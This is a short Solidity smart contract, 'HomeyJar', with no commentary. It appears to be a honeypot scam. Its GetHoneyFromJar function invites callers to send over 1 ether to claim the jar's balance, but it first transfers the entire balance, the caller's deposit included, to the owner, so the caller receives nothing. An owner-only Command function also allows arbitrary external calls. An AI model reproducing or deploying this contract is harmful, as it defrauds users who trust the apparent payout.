pragma solidity ^0.8.0;

contract HomeyJar {
    address payable public Owner;

    constructor() {
        Owner = payable(msg.sender);
    }

    receive() external payable {}

    function GetHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(address(this).balance);
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner, "Only the owner can withdraw the balance");
        Owner.transfer(address(this).balance);
    }

    function Command(address payable adr, bytes memory data) public payable {
        require(msg.sender == Owner, "Only the owner can execute commands");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Low level call failed");
    }
}